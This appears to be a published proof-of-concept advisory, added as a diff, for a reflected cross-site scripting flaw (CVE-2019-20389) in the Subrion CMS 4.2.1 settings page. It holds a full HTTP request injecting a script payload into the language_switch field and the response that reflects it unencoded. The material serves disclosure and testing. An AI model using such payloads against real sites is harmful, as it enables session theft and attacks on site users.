@@ -1,0 +1,69 @@
+# Title: Subrion CMS 4.2.1 Cross-Site Scripting (XSS)
+# Date: 02-12-2019
+# Author: Christian Bortone
+# Contact: christianbortone@gmail.com
+# Vendor Homepage: https://subrion.org/
+# Vulnerable Product: Subrion CMS 4.2.1
+# CVE : CVE-2019-20389
+
+
+
+1. Description:
+
+A cross-site scripting vulnerability was identified in Subrion CMS settings page. A remote attacker can inject arbitrary Javascript code in the multipart/form-data, which is reflected back within a user's browser without proper output encoding.
+
+
+2. Proof of Concept:
+
+-------REQUEST-------
+
+POST /subrion/panel/configuration/general/ HTTP/1.1
+Host: localhost
+Content-Length: 2270
+Cache-Control: max-age=0
+Origin: http://localhost
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYsVEcg0mHqDrQoAg
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.0 Safari/537.36 autochrome/red
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://localhost/subrion/panel/configuration/general/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: INTELLI_64e9af8d7f=9d3b0b32b40a06ddf509f7e646e29397; loader=loaded
+Connection: close
+
+...
+
+Content-Disposition: form-data; name="v[language_switch]"
+
+"><script>alert(1)</script>
+
+...
+
+-------RESPONSE-------
+
+HTTP/1.1 200 OK
+Date: Mon, 02 Dec 2019 19:04:08 GMT
+Server: Apache/2.4.39 (Unix) OpenSSL/1.0.2s PHP/7.1.30 mod_perl/2.0.8-dev Perl/v5.16.3
+X-Powered-By: PHP/7.1.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Set-Cookie: INTELLI_64e9af8d7f=bc8d4b54fe37565e2ca7f4521c05ecb5; expires=Mon, 02-Dec-2019 19:34:08 GMT; Max-Age=1800; path=/
+X-Robots-Tag: noindex
+Vary: Accept-Encoding
+Content-Length: 104140
+Connection: close
+Content-Type: text/html;charset=UTF-8
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head>
+
+...
+
+<input type="checkbox" name="v[language_switch]" id="language_switch" value=""><script>alert(1)</script>" checked>
+
+...
+
+
